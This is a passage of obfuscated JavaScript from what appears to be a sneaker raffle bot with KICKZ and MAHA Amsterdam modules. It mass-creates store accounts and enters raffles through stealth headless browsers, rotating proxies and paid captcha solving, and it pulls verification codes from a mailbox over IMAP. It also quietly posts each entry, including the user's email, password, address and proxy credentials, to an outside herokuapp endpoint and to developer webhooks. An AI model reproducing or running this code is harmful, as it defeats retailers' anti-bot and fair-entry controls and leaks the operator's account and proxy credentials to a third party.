                                            await _0x310f97(_0x2795a0['webhook'], _0x24da3['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x24da3['succesDEVMSG']), await _0xa2099c(0xc8);
                                    try {
                                        await _0x310f97(_0x44d24a, _0x24da3['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x334e83)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0xa2099c(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0xa2099c(0xbb8), await _0x535b2c['click']('.zoid-outlet'), await _0xa2099c(0x7d0), await _0x2375e4();
                    } catch (_0x56169c) {
                        console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x5e6c12['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20' + _0x56169c)), _0x390a69 = '' + _0x56169c;
                        var _0x5031fa = await _0x258e8b(_0x4af20c[_0x16d763], _0x5e6c12, 'dev', !![], _0x390a69);
                        _0x24da3['errorDEV'] = { 'embeds': [_0x5031fa] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x24da3['errorDEV']), await _0x310f97(_0x281108, _0x24da3['errorDEV']);
                    } finally {
                        _0x430cc7 && _0x430cc7['close']();
                        if (_0x194a26 == 'yes' && _0x428842 != 0x5 && _0x390a69 != 'Size\x20Not\x20Found') {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x5e6c12['name'] + ']\x20Task\x20' + (_0x16d763 + 0x1) + '\x20:\x20Retrying\x20(' + _0x428842 + '\x20/\x205)')), _0x16d763 = _0x16d763 - 0x1, _0x428842 = _0x428842 + 0x1;
                            continue;
                        }
                        _0x194a26 == 'yes' && _0x428842 >= 0x5 && (_0x391951(afew[_0x16d763], _0x5e6c12), _0x194a26 = 'no', _0x428842 = 0x0), console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1a98a0, _0x55a498, _0x10989f) {
                    _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2795a0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4e0746 = 0x0; _0x4e0746 < _0x55a498['length']; _0x4e0746++) {
                        const _0x13b5b8 = 'https://www.kickz.com/login';
                        if (_0x446b1e != 'yes')
                            var _0x446b1e = '', _0x2613ea = 0x0;
                        _0x215576(_0x1a98a0['name'] + '\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20/\x20' + _0x55a498['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                        try {
                            await _0x53ad15(_0x55a498, _0x4e0746);
                        } catch {
                            _0x446b1e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x519381 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1bdb7f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2795a0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x39dec1
                                }
                            ]
                        }];
                        const _0x229e2c = { 'embeds': _0x519381 };
                        var _0x59c6f2 = await _0x258e8b(_0x55a498[_0x4e0746], _0x1a98a0, 'acc', ![]);
                        const _0x36683c = { 'succesDEVMSG': { 'embeds': [_0x59c6f2] } };
                        if (_0x55a498[_0x4e0746]['Email'] == '' || _0x55a498[_0x4e0746]['FirstName'] == '' || _0x55a498[_0x4e0746]['LastName'] == '') {
                            console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x55a498[_0x4e0746]['Password'] == '' && (_0x55a498[_0x4e0746]['Password'] = 'JRaffles23!');
                        if (_0x2795a0['useRandomProxy'] = ![])
                            var _0x4a5986 = _0x10989f[_0x4e0746]['split'](':');
                        else
                            var _0x1b8714 = Math['round'](Math['random']() * (_0x10989f['length'] - 0x1)), _0x4a5986 = _0x10989f[_0x1b8714]['split'](':');
                        var _0x8c0ace;
                        try {
                            _0x8c0ace = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a5986[0x0] + ':' + _0x4a5986[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x8c0ace = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a5986[0x0] + ':' + _0x4a5986[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1fa518 = await _0x8c0ace['newPage']();
                            await _0x1fa518['authenticate']({
                                'username': '' + _0x4a5986[0x2],
                                'password': '' + _0x4a5986[0x3]
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1fa518['setRequestInterception'](!![]), _0x1fa518['on']('request', _0x343e1b => {
                                _0x343e1b['resourceType']() === 'image' || _0x343e1b['resourceType']() === 'font' || _0x343e1b['resourceType']() === 'media' ? _0x343e1b['abort']() : _0x343e1b['continue']();
                            }), await _0x1fa518['goto'](_0x13b5b8), await _0xa2099c(0xbb8), console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1fa518['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1fa518['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1fa518['waitForSelector']('#button-register'), await _0xa2099c(0x7d0), await _0x1fa518['evaluate'](() => {
                                const _0x135490 = document['querySelector']('#button-register');
                                _0x135490['click']();
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xa2099c(0x1388), await _0x1fa518['waitForSelector']('#customer_salutation'), await _0x1fa518['select']('#customer_salutation', 'mr'), await _0xa2099c(0x7d0), await _0x1fa518['waitForSelector']('#customer_firstname'), await _0x1fa518['type']('#customer_firstname', '' + _0x55a498[_0x4e0746]['FirstName']), await _0xa2099c(0x352), await _0x1fa518['waitForSelector']('#customer_lastname'), await _0x1fa518['type']('#customer_lastname', '' + _0x55a498[_0x4e0746]['LastName']), await _0xa2099c(0x352), await _0x1fa518['type']('#email-input', '' + _0x55a498[_0x4e0746]['Email']), await _0xa2099c(0x352), await _0x1fa518['type']('#email-confirm-input', '' + _0x55a498[_0x4e0746]['Email']), await _0xa2099c(0x352), await _0x1fa518['type']('#register-password', '' + _0x55a498[_0x4e0746]['Password']), await _0xa2099c(0x352), await _0x1fa518['type']('#password-confirm', '' + _0x55a498[_0x4e0746]['Password']), await _0xa2099c(0x352), console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1fa518['click']('#consent'), await _0xa2099c(0x1f4);
                            const _0x20518b = await _0x1fa518['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x20518b) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x1fa518['click']('#buttonRegister');
                            try {
                                await _0x1fa518['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x55a498[_0x4e0746]['Email']), await _0xa2099c(0x4b0);
                            async function _0x35c26e() {
                                var _0xfe7c9d, _0x1909dc = ![];
                                for (var _0x46c664 = 0x0; _0x46c664 < 0x18; _0x46c664++) {
                                    async function _0x4f0f7c() {
                                        var _0x457548 = new _0x39794d({
                                            'user': _0x2795a0['masterMail'],
                                            'password': _0x2795a0['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x149e1b(_0x39a08f) {
                                            _0x457548['openBox']('INBOX', ![], _0x39a08f);
                                        }
                                        _0x457548['once']('ready', function () {
                                            console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x149e1b(function (_0x338687, _0x1e2a4d) {
                                                console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x338687)
                                                    throw _0x338687;
                                                _0x457548['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x2773f3, _0x1fcefb) {
                                                    if (!_0x1fcefb || !_0x1fcefb['length'])
                                                        console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x457548['end']();
                                                    else {
                                                        var _0x5aaf27 = _0x457548['seq']['fetch'](_0x1fcefb, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5aaf27['on']('message', function (_0x15b516, _0xc784f3) {
                                                            var _0x2d7a8f = '(#' + _0xc784f3 + ')\x20';
                                                            _0x15b516['on']('body', function (_0x58f520, _0x37053c) {
                                                                _0x3020dc(_0x58f520, (_0x5c7476, _0x2c9246) => {
                                                                    if (_0x2c9246['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x4032a9 = _0x2c9246['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x4c49ec = _0x4032a9[0x1]['split']('<')[0x0];
                                                                        _0xfe7c9d = _0x4c49ec;
                                                                    }
                                                                });
                                                            }), _0x15b516['once']('end', function () {
                                                            });
                                                        }), _0x5aaf27['once']('error', function (_0xfb4373) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5aaf27['once']('end', function () {
                                                            _0x457548['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x457548['once']('error', function (_0xed8b4a) {
                                            console['log'](_0x536226['red'](_0xed8b4a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1909dc = !![];
                                        }), _0x457548['once']('end', async function () {
                                        }), _0x457548['connect']();
                                    }
                                    _0x4f0f7c(), await _0xa2099c(0x1388);
                                    if (_0xfe7c9d)
                                        return _0xfe7c9d;
                                    if (_0x1909dc)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x46c664 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x35c26e(), _0xa2099c(0x320), console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Verifying..'), await _0x1fa518['type']('#verificationCode', code), await _0xa2099c(0x1f4), await _0x1fa518['click']('#buttonVerify'), await _0xa2099c(0x190), await _0x1fa518['click']('#buttonVerify'), await _0xa2099c(0x3e8);
                            try {
                                await _0x1fa518['waitForSelector']('div.b-user_greeting'), _0x446b1e = 'no', console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Account\x20' + _0x55a498[_0x4e0746]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x376369['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x55a498[_0x4e0746]['Email'] + ',' + _0x55a498[_0x4e0746]['Password'] + ','), console['log'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Account\x20' + _0x55a498[_0x4e0746]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x36683c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x310f97(_0x203e00, _0x36683c['succesDEVMSG']);
                            } catch {
                                _0x446b1e = 'no', console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x3e5dc5) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20' + _0x3e5dc5)), _0x519381[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x519381[0x0]['description'] = '' + _0x3e5dc5, await _0x310f97(_0x281108, _0x229e2c), _0x446b1e = 'yes';
                        } finally {
                            _0x8c0ace && _0x8c0ace['close']();
                            if (_0x446b1e == 'yes' && _0x2613ea != 0x5) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x1a98a0['name'] + ']\x20Task\x20' + (_0x4e0746 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2613ea + '\x20/\x205)')), _0x4e0746 = _0x4e0746 - 0x1, _0x2613ea = _0x2613ea + 0x1;
                                continue;
                            }
                            _0x446b1e == 'yes' && _0x2613ea >= 0x5 && (_0x391951(_0x55a498[_0x4e0746], _0x1a98a0), _0x446b1e = 'no', _0x2613ea = 0x0), console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x650f5c, _0x3a86a7, _0xab7f32) {
                    _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2795a0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20dbc7 = 0x0; _0x20dbc7 < _0x3a86a7['length']; _0x20dbc7++) {
                        var _0x8ae15d;
                        if (_0x43205c != 'yes')
                            var _0x43205c = '', _0x4a4058 = 0x0;
                        _0x215576(_0x650f5c['name'] + '\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20/\x20' + _0x3a86a7['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                        var _0x891050 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1bdb7f
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x3a86a7[_0x20dbc7]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x3a86a7[_0x20dbc7]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2795a0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x39dec1
                                }
                            ]
                        }], _0x514491 = await _0x258e8b(_0x3a86a7[_0x20dbc7], _0x650f5c, 'dev', ![]), _0x26bcbf = await _0x258e8b(_0x3a86a7[_0x20dbc7], _0x650f5c, 'pub', ![]);
                        const _0x32bd84 = {
                            'succesDEVMSG': { 'embeds': [_0x514491] },
                            'succesPUBMSG': { 'embeds': [_0x26bcbf] }
                        };
                        try {
                            await _0x53ad15(_0x3a86a7, _0x20dbc7);
                        } catch {
                            _0x43205c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3a86a7[_0x20dbc7]['Email'] == '' || _0x3a86a7[_0x20dbc7]['Password'] == '' || _0x3a86a7[_0x20dbc7]['FirstName'] == '' || _0x3a86a7[_0x20dbc7]['LastName'] == '') {
                            console['log'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x2795a0['useRandomProxy'] = ![])
                            var _0x162658 = _0xab7f32[_0x20dbc7]['split'](':');
                        else
                            var _0x244c51 = Math['round'](Math['random']() * (_0xab7f32['length'] - 0x1)), _0x162658 = _0xab7f32[_0x244c51]['split'](':');
                        var _0x3c8c61;
                        try {
                            _0x3c8c61 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x162658[0x0] + ':' + _0x162658[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3c8c61 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x162658[0x0] + ':' + _0x162658[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x292338 = await _0x3c8c61['newPage']();
                            await _0x292338['authenticate']({
                                'username': '' + _0x162658[0x2],
                                'password': '' + _0x162658[0x3]
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x292338['setRequestInterception'](!![]), _0x292338['on']('request', _0x2e47d9 => {
                                _0x2e47d9['resourceType']() === 'image' || _0x2e47d9['resourceType']() === 'font' || _0x2e47d9['resourceType']() === 'media' ? _0x2e47d9['abort']() : _0x2e47d9['continue']();
                            }), await _0x292338['goto']('' + _0x3a86a7[_0x20dbc7]['Url'], { 'waitUntil': 'networkidle2' }), await _0xa2099c(0x12c), await _0x292338['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x292338['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xa2099c(0x7d0);
                            try {
                                await _0x292338['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x292338['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Logging\x20in'), await _0x292338['waitForSelector']('#username'), await _0x292338['type']('#username', _0x3a86a7[_0x20dbc7]['Email']), await _0x292338['waitForSelector']('#password'), await _0x292338['type']('#password', _0x3a86a7[_0x20dbc7]['Password']), await _0xa2099c(0x190), await _0x292338['click']('#buttonSubmit'), await _0x292338['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Getting\x20Product'), await _0xa2099c(0x1f4), console['log'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3a86a7[_0x20dbc7]['Size']);
                            let _0x1a92ce = _0x3a86a7[_0x20dbc7]['Size']['replace']('.5', '\x201/2');
                            if (_0x1a92ce['toUpperCase']() == 'RANDOM') {
                                const _0x22390b = await _0x292338['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x44df88 = Math['round'](Math['random']() * (_0x22390b['length'] - 0x1));
                                await _0x22390b[_0x44df88]['click']();
                            } else
                                await _0x292338['click']('button[aria-label=\x22' + _0x1a92ce + '\x22]');
                            await _0xa2099c(0x1f4);
                            try {
                                await _0x292338['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0xa2099c(0x12c), console['log'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x292338['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xa2099c(0x12c), await _0x292338['type']('#dwfrm_raffle_addressFields_firstName', _0x3a86a7[_0x20dbc7]['FirstName']), await _0xa2099c(0x12c), await _0x292338['type']('#dwfrm_raffle_addressFields_lastName', _0x3a86a7[_0x20dbc7]['LastName']), await _0xa2099c(0x12c), await _0x292338['select']('#dwfrm_raffle_addressFields_country', _0x3a86a7[_0x20dbc7]['Country']), await _0xa2099c(0x12c), await _0x292338['type']('#dwfrm_raffle_addressFields_city', _0x3a86a7[_0x20dbc7]['City']), await _0xa2099c(0x12c);
                            _0x3a86a7[_0x20dbc7]['Postcode'] == undefined && (_0x3a86a7[_0x20dbc7]['Postcode'] = _0x3a86a7[_0x20dbc7]['Zip']);
                            await _0x292338['type']('#dwfrm_raffle_addressFields_postalCode', _0x3a86a7[_0x20dbc7]['Postcode']), await _0xa2099c(0x12c), await _0x292338['type']('#dwfrm_raffle_addressFields_address1', _0x3a86a7[_0x20dbc7]['Address1']), await _0xa2099c(0x12c), await _0x292338['type']('#dwfrm_raffle_addressFields_address2', _0x3a86a7[_0x20dbc7]['HouseNumber']), await _0xa2099c(0x12c), await _0x292338['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x3a86a7[_0x20dbc7]['Address2']), await _0xa2099c(0x12c), await _0x292338['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xa2099c(0x12c), await _0x292338['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x3a86a7[_0x20dbc7]['Follower']), await _0xa2099c(0x1f4), await _0x292338['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xa2099c(0x1f4), console['log'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20' + _0x536226['blue']('Awaiting\x20Paypal\x20Payment')), await _0x292338['click']('.b-paypal_button');
                            try {
                                await _0x292338['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x43205c = 'no', _0x48af7e(_0x3a86a7[_0x20dbc7], _0x650f5c), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x32bd84['succesDEVMSG']);
                                await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x32bd84['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x44d24a, _0x32bd84['succesPUBMSG']);
                                let _0x11392d = _0x3a86a7[_0x20dbc7];
                                try {
                                    prxdata = {
                                        'username': _0x1bdb7f['replace']('#', ''),
                                        'module': _0x650f5c['name'],
                                        'entrydata': JSON['stringify'](_0x11392d),
                                        'proxy': '' + _0xab7f32[_0x20dbc7]
                                    };
                                    var _0x3d59a8 = JSON['stringify'](prxdata);
                                    let _0x2f6117 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x3d59a8, _0x2f6117);
                                } catch (_0x49feaa) {
                                }
                            } catch (_0x18c319) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x18c319)), _0x8ae15d = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x18c319;
                                var _0x1733cf = await _0x258e8b(_0x3a86a7[_0x20dbc7], _0x650f5c, 'dev', !![], _0x8ae15d);
                                _0x32bd84['errorDEV'] = { 'embeds': [_0x1733cf] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x32bd84['errorDEV']), await _0x310f97(_0x281108, _0x32bd84['errorDEV']);
                            }
                        } catch (_0x5bb12a) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20' + _0x5bb12a)), _0x8ae15d = '' + _0x5bb12a;
                            var _0x1733cf = await _0x258e8b(_0x3a86a7[_0x20dbc7], _0x650f5c, 'dev', !![], _0x8ae15d);
                            _0x32bd84['errorDEV'] = { 'embeds': [_0x1733cf] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x32bd84['errorDEV']), await _0x310f97(_0x281108, _0x32bd84['errorDEV']), _0x43205c = 'yes';
                        } finally {
                            _0x3c8c61 && _0x3c8c61['close']();
                            if (_0x43205c == 'yes' && _0x4a4058 != 0x5) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x650f5c['name'] + ']\x20Task\x20' + (_0x20dbc7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4a4058 + '\x20/\x205)')), _0x20dbc7 = _0x20dbc7 - 0x1, _0x4a4058 = _0x4a4058 + 0x1;
                                continue;
                            }
                            _0x43205c == 'yes' && _0x4a4058 >= 0x5 && (_0x391951(_0x3a86a7[_0x20dbc7], _0x650f5c), _0x43205c = 'no', _0x4a4058 = 0x0), console['log']('Waiting\x20for\x20' + _0x2795a0['AfewDelay'] + '\x20ms'), await _0xa2099c(_0x2795a0['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
